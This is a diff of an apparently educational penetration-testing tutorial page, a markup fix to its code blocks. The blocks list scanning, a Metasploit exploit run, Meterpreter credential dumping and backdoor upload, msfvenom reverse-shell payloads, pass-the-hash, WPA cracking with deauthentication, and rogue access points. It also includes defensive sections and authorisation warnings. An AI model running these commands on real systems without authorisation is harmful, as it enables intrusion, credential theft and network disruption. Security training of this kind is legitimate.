-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sn 192.168.1.0/24
+          <div class="code-block"><span class="cmm"># Ping sweep to find live hosts</span>
+<span class="fn">nmap</span> -sn 192.168.1.0/24
 
-&lt;span class="cmm"&gt;# ARP scan (local network only)&lt;/span&gt;
-&lt;span class="fn"&gt;arp-scan&lt;/span&gt; -l
+<span class="cmm"># ARP scan (local network only)</span>
+<span class="fn">arp-scan</span> -l
 
-&lt;span class="cmm"&gt;# Traceroute&lt;/span&gt;
-&lt;span class="fn"&gt;traceroute&lt;/span&gt; example.com
-&lt;span class="fn"&gt;mtr&lt;/span&gt; example.com   &lt;span class="cmm"&gt;# Continuous traceroute&lt;/span&gt;
+<span class="cmm"># Traceroute</span>
+<span class="fn">traceroute</span> example.com
+<span class="fn">mtr</span> example.com   <span class="cmm"># Continuous traceroute</span>
 
-&lt;span class="cmm"&gt;# Banner grabbing&lt;/span&gt;
-&lt;span class="fn"&gt;nc&lt;/span&gt; -v example.com 80
-&lt;span class="fn"&gt;telnet&lt;/span&gt; example.com 22
+<span class="cmm"># Banner grabbing</span>
+<span class="fn">nc</span> -v example.com 80
+<span class="fn">telnet</span> example.com 22
 
-&lt;span class="cmm"&gt;# SSL/TLS certificate inspection&lt;/span&gt;
-&lt;span class="fn"&gt;openssl&lt;/span&gt; s_client -connect example.com:443
-&lt;span class="fn"&gt;sslscan&lt;/span&gt; example.com
-&lt;span class="fn"&gt;testssl.sh&lt;/span&gt; example.com&lt;/div&gt;
+<span class="cmm"># SSL/TLS certificate inspection</span>
+<span class="fn">openssl</span> s_client -connect example.com:443
+<span class="fn">sslscan</span> example.com
+<span class="fn">testssl.sh</span> example.com</div>
         </div>
       </section>
 
@@ -919,67 +919,67 @@ EOF
         <h3>Nmap — The Network Mapper</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Basic port scan&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; 192.168.1.1
+          <div class="code-block"><span class="cmm"># Basic port scan</span>
+<span class="fn">nmap</span> 192.168.1.1
 
-&lt;span class="cmm"&gt;# Scan all ports&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -p- 192.168.1.1
+<span class="cmm"># Scan all ports</span>
+<span class="fn">nmap</span> -p- 192.168.1.1
 
-&lt;span class="cmm"&gt;# Service version detection&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sV 192.168.1.1
+<span class="cmm"># Service version detection</span>
+<span class="fn">nmap</span> -sV 192.168.1.1
 
-&lt;span class="cmm"&gt;# OS detection&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -O 192.168.1.1
+<span class="cmm"># OS detection</span>
+<span class="fn">nmap</span> -O 192.168.1.1
 
-&lt;span class="cmm"&gt;# Aggressive scan (OS + version + scripts + traceroute)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -A 192.168.1.1
+<span class="cmm"># Aggressive scan (OS + version + scripts + traceroute)</span>
+<span class="fn">nmap</span> -A 192.168.1.1
 
-&lt;span class="cmm"&gt;# Stealth SYN scan (doesn't complete TCP handshake)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sS 192.168.1.1
+<span class="cmm"># Stealth SYN scan (doesn't complete TCP handshake)</span>
+<span class="fn">nmap</span> -sS 192.168.1.1
 
-&lt;span class="cmm"&gt;# UDP scan&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sU 192.168.1.1
+<span class="cmm"># UDP scan</span>
+<span class="fn">nmap</span> -sU 192.168.1.1
 
-&lt;span class="cmm"&gt;# Scan with NSE scripts&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script vuln 192.168.1.1
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script smb-enum-shares 192.168.1.1
-&lt;span class="fn"&gt;nmap&lt;/span&gt; --script http-enum 192.168.1.1
+<span class="cmm"># Scan with NSE scripts</span>
+<span class="fn">nmap</span> --script vuln 192.168.1.1
+<span class="fn">nmap</span> --script smb-enum-shares 192.168.1.1
+<span class="fn">nmap</span> --script http-enum 192.168.1.1
 
-&lt;span class="cmm"&gt;# Output formats&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -oA scan_results 192.168.1.1   &lt;span class="cmm"&gt;# Normal, XML, and grepable&lt;/span&gt;
+<span class="cmm"># Output formats</span>
+<span class="fn">nmap</span> -oA scan_results 192.168.1.1   <span class="cmm"># Normal, XML, and grepable</span>
 
-&lt;span class="cmm"&gt;# Scan a network range&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; 192.168.1.0/24
+<span class="cmm"># Scan a network range</span>
+<span class="fn">nmap</span> 192.168.1.0/24
 
-&lt;span class="cmm"&gt;# Timing templates (T0 = paranoid, T5 = insane)&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -T4 -sS -p- 192.168.1.1&lt;/div&gt;
+<span class="cmm"># Timing templates (T0 = paranoid, T5 = insane)</span>
+<span class="fn">nmap</span> -T4 -sS -p- 192.168.1.1</div>
         </div>
         <h3>Enumeration Techniques</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# SMB enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;enum4linux&lt;/span&gt; -a 192.168.1.10
-&lt;span class="fn"&gt;smbclient&lt;/span&gt; -L //192.168.1.10
-&lt;span class="fn"&gt;rpcclient&lt;/span&gt; -U "" 192.168.1.10
+          <div class="code-block"><span class="cmm"># SMB enumeration</span>
+<span class="fn">enum4linux</span> -a 192.168.1.10
+<span class="fn">smbclient</span> -L //192.168.1.10
+<span class="fn">rpcclient</span> -U "" 192.168.1.10
 
-&lt;span class="cmm"&gt;# SNMP enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;snmpwalk&lt;/span&gt; -c public -v1 192.168.1.10
-&lt;span class="fn"&gt;onesixtyone&lt;/span&gt; -c community.txt 192.168.1.0/24
+<span class="cmm"># SNMP enumeration</span>
+<span class="fn">snmpwalk</span> -c public -v1 192.168.1.10
+<span class="fn">onesixtyone</span> -c community.txt 192.168.1.0/24
 
-&lt;span class="cmm"&gt;# DNS enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;dnsenum&lt;/span&gt; example.com
-&lt;span class="fn"&gt;fierce&lt;/span&gt; --domain example.com
+<span class="cmm"># DNS enumeration</span>
+<span class="fn">dnsenum</span> example.com
+<span class="fn">fierce</span> --domain example.com
 
-&lt;span class="cmm"&gt;# Web enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;gobuster&lt;/span&gt; dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
-&lt;span class="fn"&gt;dirb&lt;/span&gt; http://example.com
-&lt;span class="fn"&gt;nikto&lt;/span&gt; -h http://example.com
+<span class="cmm"># Web enumeration</span>
+<span class="fn">gobuster</span> dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
+<span class="fn">dirb</span> http://example.com
+<span class="fn">nikto</span> -h http://example.com
 
-&lt;span class="cmm"&gt;# LDAP enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;ldapsearch&lt;/span&gt; -x -H ldap://192.168.1.10 -b "dc=example,dc=com"
+<span class="cmm"># LDAP enumeration</span>
+<span class="fn">ldapsearch</span> -x -H ldap://192.168.1.10 -b "dc=example,dc=com"
 
-&lt;span class="cmm"&gt;# SMTP enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;smtp-user-enum&lt;/span&gt; -M VRFY -U users.txt -t 192.168.1.10&lt;/div&gt;
+<span class="cmm"># SMTP enumeration</span>
+<span class="fn">smtp-user-enum</span> -M VRFY -U users.txt -t 192.168.1.10</div>
         </div>
       </section>
 
@@ -1001,39 +1001,39 @@ EOF
         <h3>Metasploit Framework</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Start Metasploit&lt;/span&gt;
-&lt;span class="fn"&gt;msfconsole&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Start Metasploit</span>
+<span class="fn">msfconsole</span>
 
-&lt;span class="cmm"&gt;# Search for exploits&lt;/span&gt;
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; search type:exploit name:apache
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; search cve:2024 platform:linux
+<span class="cmm"># Search for exploits</span>
+<span class="fn">msf6</span> > search type:exploit name:apache
+<span class="fn">msf6</span> > search cve:2024 platform:linux
 
-&lt;span class="cmm"&gt;# Use an exploit&lt;/span&gt;
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; use exploit/multi/http/apache_normalize_path_rce
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; show options
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set RHOSTS 192.168.1.10
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set LHOST 192.168.1.5
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; set LPORT 4444
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; exploit
+<span class="cmm"># Use an exploit</span>
+<span class="fn">msf6</span> > use exploit/multi/http/apache_normalize_path_rce
+<span class="fn">msf6</span> > show options
+<span class="fn">msf6</span> > set RHOSTS 192.168.1.10
+<span class="fn">msf6</span> > set LHOST 192.168.1.5
+<span class="fn">msf6</span> > set LPORT 4444
+<span class="fn">msf6</span> > exploit
 
-&lt;span class="cmm"&gt;# Meterpreter commands (post-exploitation)&lt;/span&gt;
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; sysinfo
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; getuid
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; ps
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; shell
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; download /etc/passwd
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; upload backdoor.sh /tmp/
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; hashdump
+<span class="cmm"># Meterpreter commands (post-exploitation)</span>
+<span class="fn">meterpreter</span> > sysinfo
+<span class="fn">meterpreter</span> > getuid
+<span class="fn">meterpreter</span> > ps
+<span class="fn">meterpreter</span> > shell
+<span class="fn">meterpreter</span> > download /etc/passwd
+<span class="fn">meterpreter</span> > upload backdoor.sh /tmp/
+<span class="fn">meterpreter</span> > hashdump
 
-&lt;span class="cmm"&gt;# Background session and pivot&lt;/span&gt;
-&lt;span class="fn"&gt;meterpreter&lt;/span&gt; &gt; background
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; sessions -l
-&lt;span class="fn"&gt;msf6&lt;/span&gt; &gt; sessions -i 1
+<span class="cmm"># Background session and pivot</span>
+<span class="fn">meterpreter</span> > background
+<span class="fn">msf6</span> > sessions -l
+<span class="fn">msf6</span> > sessions -i 1
 
-&lt;span class="cmm"&gt;# Generate payloads&lt;/span&gt;
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
-&lt;span class="fn"&gt;msfvenom&lt;/span&gt; -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php&lt;/div&gt;
+<span class="cmm"># Generate payloads</span>
+<span class="fn">msfvenom</span> -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
+<span class="fn">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
+<span class="fn">msfvenom</span> -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php</div>
         </div>
         <div class="explanation warning">
           <strong>Ethical Boundary:</strong> Exploitation should only proceed with proper authorization. Document every action, and never access data beyond what's needed to prove the vulnerability. Report findings responsibly.
@@ -1048,53 +1048,53 @@ EOF
         <h3>Privilege Escalation</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Linux privilege escalation enumeration&lt;/span&gt;
-&lt;span class="cmm"&gt;# Automated tools:&lt;/span&gt;
-&lt;span class="fn"&gt;linpeas.sh&lt;/span&gt;       &lt;span class="cmm"&gt;# Linux Privilege Escalation Awesome Script&lt;/span&gt;
-&lt;span class="fn"&gt;linenum.sh&lt;/span&gt;       &lt;span class="cmm"&gt;# Linux enumeration script&lt;/span&gt;
-&lt;span class="fn"&gt;unix-privesc-check&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Linux privilege escalation enumeration</span>
+<span class="cmm"># Automated tools:</span>
+<span class="fn">linpeas.sh</span>       <span class="cmm"># Linux Privilege Escalation Awesome Script</span>
+<span class="fn">linenum.sh</span>       <span class="cmm"># Linux enumeration script</span>
+<span class="fn">unix-privesc-check</span>
 
-&lt;span class="cmm"&gt;# Manual checks:&lt;/span&gt;
-&lt;span class="fn"&gt;sudo&lt;/span&gt; -l          &lt;span class="cmm"&gt;# List sudo privileges&lt;/span&gt;
-&lt;span class="fn"&gt;find&lt;/span&gt; / -perm -4000 -type f 2&gt;/dev/null   &lt;span class="cmm"&gt;# SUID binaries&lt;/span&gt;
-&lt;span class="fn"&gt;find&lt;/span&gt; / -perm -2000 -type f 2&gt;/dev/null   &lt;span class="cmm"&gt;# SGID binaries&lt;/span&gt;
-&lt;span class="fn"&gt;cat&lt;/span&gt; /etc/crontab                         &lt;span class="cmm"&gt;# Cron jobs&lt;/span&gt;
-&lt;span class="fn"&gt;cat&lt;/span&gt; /etc/passwd | grep sh$              &lt;span class="cmm"&gt;# Users with shells&lt;/span&gt;
-&lt;span class="fn"&gt;uname&lt;/span&gt; -a                                 &lt;span class="cmm"&gt;# Kernel version (exploits?)&lt;/span&gt;
-&lt;span class="fn"&gt;ps&lt;/span&gt; aux                                   &lt;span class="cmm"&gt;# Running processes&lt;/span&gt;
-&lt;span class="fn"&gt;netstat&lt;/span&gt; -tulpn                           &lt;span class="cmm"&gt;# Listening services&lt;/span&gt;
+<span class="cmm"># Manual checks:</span>
+<span class="fn">sudo</span> -l          <span class="cmm"># List sudo privileges</span>
+<span class="fn">find</span> / -perm -4000 -type f 2>/dev/null   <span class="cmm"># SUID binaries</span>
+<span class="fn">find</span> / -perm -2000 -type f 2>/dev/null   <span class="cmm"># SGID binaries</span>
+<span class="fn">cat</span> /etc/crontab                         <span class="cmm"># Cron jobs</span>
+<span class="fn">cat</span> /etc/passwd | grep sh$              <span class="cmm"># Users with shells</span>
+<span class="fn">uname</span> -a                                 <span class="cmm"># Kernel version (exploits?)</span>
+<span class="fn">ps</span> aux                                   <span class="cmm"># Running processes</span>
+<span class="fn">netstat</span> -tulpn                           <span class="cmm"># Listening services</span>
 
-&lt;span class="cmm"&gt;# Common privilege escalation vectors:&lt;/span&gt;
-&lt;span class="cmm"&gt;# - SUID binaries (nmap, vim, less, etc.)&lt;/span&gt;
-&lt;span class="cmm"&gt;# - Writable /etc/passwd or /etc/sudoers&lt;/span&gt;
-&lt;span class="cmm"&gt;# - Kernel exploits&lt;/span&gt;
-&lt;span class="cmm"&gt;# - Cron jobs with writable scripts&lt;/span&gt;
-&lt;span class="cmm"&gt;# - PATH manipulation&lt;/span&gt;
-&lt;span class="cmm"&gt;# - Docker container escape&lt;/span&gt;
-&lt;span class="cmm"&gt;# - Sudo misconfigurations&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Common privilege escalation vectors:</span>
+<span class="cmm"># - SUID binaries (nmap, vim, less, etc.)</span>
+<span class="cmm"># - Writable /etc/passwd or /etc/sudoers</span>
+<span class="cmm"># - Kernel exploits</span>
+<span class="cmm"># - Cron jobs with writable scripts</span>
+<span class="cmm"># - PATH manipulation</span>
+<span class="cmm"># - Docker container escape</span>
+<span class="cmm"># - Sudo misconfigurations</span></div>
         </div>
         <h3>Lateral Movement</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Pass-the-hash (Windows)&lt;/span&gt;
-&lt;span class="fn"&gt;pth-winexe&lt;/span&gt; -U Administrator%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.20 cmd
+          <div class="code-block"><span class="cmm"># Pass-the-hash (Windows)</span>
+<span class="fn">pth-winexe</span> -U Administrator%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.20 cmd
 
-&lt;span class="cmm"&gt;# SSH key pivoting&lt;/span&gt;
-&lt;span class="fn"&gt;ssh&lt;/span&gt; -i id_rsa user@pivot-host
-&lt;span class="cmm"&gt;# Then scan internal network from pivot&lt;/span&gt;
-&lt;span class="fn"&gt;nmap&lt;/span&gt; -sT 10.0.0.0/24
+<span class="cmm"># SSH key pivoting</span>
+<span class="fn">ssh</span> -i id_rsa user@pivot-host
+<span class="cmm"># Then scan internal network from pivot</span>
+<span class="fn">nmap</span> -sT 10.0.0.0/24
 
-&lt;span class="cmm"&gt;# Proxychains for routing through compromised host&lt;/span&gt;
-&lt;span class="cmm"&gt;# In /etc/proxychains.conf:&lt;/span&gt;
-&lt;span class="cmm"&gt;# socks5 127.0.0.1 1080&lt;/span&gt;
-&lt;span class="fn"&gt;proxychains&lt;/span&gt; nmap -sT 10.0.0.0/24
+<span class="cmm"># Proxychains for routing through compromised host</span>
+<span class="cmm"># In /etc/proxychains.conf:</span>
+<span class="cmm"># socks5 127.0.0.1 1080</span>
+<span class="fn">proxychains</span> nmap -sT 10.0.0.0/24
 
-&lt;span class="cmm"&gt;# SSH dynamic port forwarding&lt;/span&gt;
-&lt;span class="fn"&gt;ssh&lt;/span&gt; -D 1080 -i id_rsa user@compromised-host
+<span class="cmm"># SSH dynamic port forwarding</span>
+<span class="fn">ssh</span> -D 1080 -i id_rsa user@compromised-host
 
-&lt;span class="cmm"&gt;# BloodHound (Active Directory attack paths)&lt;/span&gt;
-&lt;span class="fn"&gt;bloodhound-python&lt;/span&gt; -d example.com -u user -p password -c All
-&lt;span class="cmm"&gt;# Then analyze with BloodHound GUI&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># BloodHound (Active Directory attack paths)</span>
+<span class="fn">bloodhound-python</span> -d example.com -u user -p password -c All
+<span class="cmm"># Then analyze with BloodHound GUI</span></div>
         </div>
         <h3>Persistence Techniques</h3>
         <ul>
@@ -1134,19 +1134,19 @@ EOF
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Check wireless interface&lt;/span&gt;
-&lt;span class="fn"&gt;iwconfig&lt;/span&gt;
-&lt;span class="fn"&gt;ip&lt;/span&gt; link show
+          <div class="code-block"><span class="cmm"># Check wireless interface</span>
+<span class="fn">iwconfig</span>
+<span class="fn">ip</span> link show
 
-&lt;span class="cmm"&gt;# Enable monitor mode (requires compatible adapter)&lt;/span&gt;
-&lt;span class="fn"&gt;airmon-ng&lt;/span&gt; check kill    &lt;span class="cmm"&gt;# Kill interfering processes&lt;/span&gt;
-&lt;span class="fn"&gt;airmon-ng&lt;/span&gt; start wlan0   &lt;span class="cmm"&gt;# Creates wlan0mon interface&lt;/span&gt;
+<span class="cmm"># Enable monitor mode (requires compatible adapter)</span>
+<span class="fn">airmon-ng</span> check kill    <span class="cmm"># Kill interfering processes</span>
+<span class="fn">airmon-ng</span> start wlan0   <span class="cmm"># Creates wlan0mon interface</span>
 
-&lt;span class="cmm"&gt;# Scan for wireless networks&lt;/span&gt;
-&lt;span class="fn"&gt;airodump-ng&lt;/span&gt; wlan0mon
+<span class="cmm"># Scan for wireless networks</span>
+<span class="fn">airodump-ng</span> wlan0mon
 
-&lt;span class="cmm"&gt;# Detailed scan on specific channel&lt;/span&gt;
-&lt;span class="fn"&gt;airodump-ng&lt;/span&gt; -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon&lt;/div&gt;
+<span class="cmm"># Detailed scan on specific channel</span>
+<span class="fn">airodump-ng</span> -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</div>
         </div>
       </section>
 
@@ -1170,22 +1170,22 @@ EOF
         <p>The WPA2 4-way handshake is used to derive the Pairwise Transient Key (PTK) from the Pairwise Master Key (PMK). Capturing this handshake is the basis for offline password cracking attacks.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Capture WPA handshake&lt;/span&gt;
-&lt;span class="fn"&gt;airodump-ng&lt;/span&gt; -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+          <div class="code-block"><span class="cmm"># Capture WPA handshake</span>
+<span class="fn">airodump-ng</span> -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
 
-&lt;span class="cmm"&gt;# Deauthenticate a client to force reconnection (capture handshake)&lt;/span&gt;
-&lt;span class="fn"&gt;aireplay-ng&lt;/span&gt; -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+<span class="cmm"># Deauthenticate a client to force reconnection (capture handshake)</span>
+<span class="fn">aireplay-ng</span> -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
 
-&lt;span class="cmm"&gt;# Crack with aircrack-ng (dictionary attack)&lt;/span&gt;
-&lt;span class="fn"&gt;aircrack-ng&lt;/span&gt; -w /usr/share/wordlists/rockyou.txt handshake-01.cap
+<span class="cmm"># Crack with aircrack-ng (dictionary attack)</span>
+<span class="fn">aircrack-ng</span> -w /usr/share/wordlists/rockyou.txt handshake-01.cap
 
-&lt;span class="cmm"&gt;# Crack with hashcat (GPU-accelerated)&lt;/span&gt;
-&lt;span class="fn"&gt;hcxpcapngtool&lt;/span&gt; -o hash.hc22000 handshake-01.cap
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+<span class="cmm"># Crack with hashcat (GPU-accelerated)</span>
+<span class="fn">hcxpcapngtool</span> -o hash.hc22000 handshake-01.cap
+<span class="fn">hashcat</span> -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
 
-&lt;span class="cmm"&gt;# WPA3 downgrade attack (Dragonblood)&lt;/span&gt;
-&lt;span class="cmm"&gt;# Forces WPA3 to downgrade to WPA2, then perform standard attack&lt;/span&gt;
-&lt;span class="cmm"&gt;# Requires specific tools and vulnerable implementations&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># WPA3 downgrade attack (Dragonblood)</span>
+<span class="cmm"># Forces WPA3 to downgrade to WPA2, then perform standard attack</span>
+<span class="cmm"># Requires specific tools and vulnerable implementations</span></div>
         </div>
         <div class="explanation warning">
           <strong>Important:</strong> Only test wireless security on networks you own or have explicit written permission to test. Unauthorized access to wireless networks is illegal under laws like the Computer Fraud and Abuse Act (CFAA).
@@ -1207,29 +1207,29 @@ EOF
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# WPS PIN attack with Reaver&lt;/span&gt;
-&lt;span class="fn"&gt;reaver&lt;/span&gt; -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+          <div class="code-block"><span class="cmm"># WPS PIN attack with Reaver</span>
+<span class="fn">reaver</span> -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 
-&lt;span class="cmm"&gt;# PMKID attack (no client needed!)&lt;/span&gt;
-&lt;span class="fn"&gt;hcxdumptool&lt;/span&gt; -i wlan0mon -o capture.pcapng --enable_status=1
-&lt;span class="fn"&gt;hcxpcapngtool&lt;/span&gt; -o hash.hc22000 -E wordlist capture.pcapng
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 22000 hash.hc22000 wordlist
+<span class="cmm"># PMKID attack (no client needed!)</span>
+<span class="fn">hcxdumptool</span> -i wlan0mon -o capture.pcapng --enable_status=1
+<span class="fn">hcxpcapngtool</span> -o hash.hc22000 -E wordlist capture.pcapng
+<span class="fn">hashcat</span> -m 22000 hash.hc22000 wordlist
 
-&lt;span class="cmm"&gt;# Evil Twin with Wifiphisher&lt;/span&gt;
-&lt;span class="fn"&gt;wifiphisher&lt;/span&gt; -aI wlan0 -eI wlan1 -p firmware-upgrade
+<span class="cmm"># Evil Twin with Wifiphisher</span>
+<span class="fn">wifiphisher</span> -aI wlan0 -eI wlan1 -p firmware-upgrade
 
-&lt;span class="cmm"&gt;# Create rogue AP with hostapd&lt;/span&gt;
-&lt;span class="cmm"&gt;# /etc/hostapd/hostapd.conf:&lt;/span&gt;
-&lt;span class="kw"&gt;interface&lt;/span&gt;=wlan0
-&lt;span class="kw"&gt;driver&lt;/span&gt;=nl80211
-&lt;span class="kw"&gt;ssid&lt;/span&gt;=&lt;span class="str"&gt;"FreeWiFi"&lt;/span&gt;
-&lt;span class="kw"&gt;channel&lt;/span&gt;=6
-&lt;span class="kw"&gt;wpa&lt;/span&gt;=2
-&lt;span class="kw"&gt;wpa_passphrase&lt;/span&gt;=&lt;span class="str"&gt;"password123"&lt;/span&gt;
-&lt;span class="kw"&gt;wpa_key_mgmt&lt;/span&gt;=WPA-PSK
-&lt;span class="kw"&gt;rsn_pairwise&lt;/span&gt;=CCMP
+<span class="cmm"># Create rogue AP with hostapd</span>
+<span class="cmm"># /etc/hostapd/hostapd.conf:</span>
+<span class="kw">interface</span>=wlan0
+<span class="kw">driver</span>=nl80211
+<span class="kw">ssid</span>=<span class="str">"FreeWiFi"</span>
+<span class="kw">channel</span>=6
+<span class="kw">wpa</span>=2
+<span class="kw">wpa_passphrase</span>=<span class="str">"password123"</span>
+<span class="kw">wpa_key_mgmt</span>=WPA-PSK
+<span class="kw">rsn_pairwise</span>=CCMP
 
-&lt;span class="fn"&gt;hostapd&lt;/span&gt; /etc/hostapd/hostapd.conf&lt;/div&gt;
+<span class="fn">hostapd</span> /etc/hostapd/hostapd.conf</div>
         </div>
       </section>
 
@@ -1250,14 +1250,14 @@ EOF
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Detect rogue APs with Kismet&lt;/span&gt;
-&lt;span class="fn"&gt;kismet&lt;/span&gt; -c wlan0mon
+          <div class="code-block"><span class="cmm"># Detect rogue APs with Kismet</span>
+<span class="fn">kismet</span> -c wlan0mon
 
-&lt;span class="cmm"&gt;# Check for unauthorized clients on your network&lt;/span&gt;
-&lt;span class="fn"&gt;airodump-ng&lt;/span&gt; --bssid YOUR:AP:MAC -c 6 wlan0mon
+<span class="cmm"># Check for unauthorized clients on your network</span>
+<span class="fn">airodump-ng</span> --bssid YOUR:AP:MAC -c 6 wlan0mon
 
-&lt;span class="cmm"&gt;# Verify no WPS is enabled&lt;/span&gt;
-&lt;span class="fn"&gt;wash&lt;/span&gt; -i wlan0mon   &lt;span class="cmm"&gt;# Lists WPS-enabled networks&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Verify no WPS is enabled</span>
+<span class="fn">wash</span> -i wlan0mon   <span class="cmm"># Lists WPS-enabled networks</span></div>
         </div>
         <div class="tip-box">
           <strong>Tip:</strong> For enterprise environments, implement <strong>802.1X with EAP-TLS</strong> (certificate-based authentication) rather than EAP-PEAP or EAP-TTLS, which are vulnerable to credential relay attacks.
@@ -1288,16 +1288,16 @@ EOF
         <h3>IDS/IPS Placement</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">network</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;Internet
+          <div class="code-block">Internet
     |
     v
-[Firewall] ----&gt; [NIDS/IPS] ----&gt; [Internal Network]
+[Firewall] ----> [NIDS/IPS] ----> [Internal Network]
     |                |
-    |                +---&gt; [DMZ Segment]
-    |                +---&gt; [Critical Assets Segment]
+    |                +---> [DMZ Segment]
+    |                +---> [Critical Assets Segment]
     |
     v
-[Web Servers]  [HIDS on each server]&lt;/div&gt;
+[Web Servers]  [HIDS on each server]</div>
         </div>
       </section>
 
@@ -1308,45 +1308,45 @@ EOF
         <p><strong>Snort</strong> is an open-source network intrusion detection and prevention system developed by Cisco. It uses a rule-based language to detect malicious network activity and can operate in sniffer, packet logger, or NIDS/NIPS mode.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Install Snort&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install snort
+          <div class="code-block"><span class="cmm"># Install Snort</span>
+<span class="fn">apt</span> install snort
 
